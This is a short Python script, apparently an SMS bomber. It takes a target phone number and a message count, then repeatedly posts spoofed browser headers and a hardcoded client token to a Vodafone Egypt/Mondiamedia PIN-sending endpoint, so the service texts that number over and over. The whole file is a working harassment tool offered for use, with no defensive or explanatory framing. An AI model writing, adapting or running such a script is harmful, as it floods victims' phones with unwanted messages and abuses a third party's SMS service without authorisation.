#UNLIMITED 3 SMS ONLY ON VODAFONE/ORANGE/ETISALAT/WE
import requests
a = 0
try:
	num = input('\033[1;32mEnter Phone Number \033[1;34m:\033[1;39m ')
	count = int(input('\033[1;32mEnter Number Of Messages \033[1;34m: \033[1;39m'))
except:
	print()
	print('\033[1;31mwrong entry')
	exit('\033[1;39m')
print()

op = 0
while op<count:
    hd = {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Content-Length": "491",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Host": "menad2c.mondiamedia.com",
    "Origin": "http://smart.vodafone.com.eg",
    "Referer": "http://smart.vodafone.com.eg/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.76"
  }
  
    url = 'http://menad2c.mondiamedia.com/landing/vflive/inAppFlow-New-Status-playwin/sendPin.php'

    data = {
'clientToken':'C1e664539-9dc1-4026-8ce6-23746bce3633',
'bodyParams[lang]':'en',
'bodyParams[marketingCampaign][sc]':'22',
'bodyParams[marketingCampaign][operatorId]':'10',
'bodyParams[marketingCampaign][userAgent]':'Mozilla/5.0+(Linux;+Android+8.1.0;+SM-T585)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/108.0.0.0+Safari/537.36',
'bodyParams[marketingCampaign][lp]':'Play',
'bodyParams[msisdn]':num,
'bodyParams[subscriptionTypeId]':'75850001'
}

    r = requests.post(url, headers=hd, data=data).text
    op = op + 1
    if '200' in r:
    	print(f'\x1b[1;99m• \x1b[1;92mDone Send Sms {op}')
    else:
    		print("\x1b[1;99m• \x1b[1;91mThere's a mistake")
    		print('\033[1;39m')
    		exit()

print('\033[1;39m')
                            
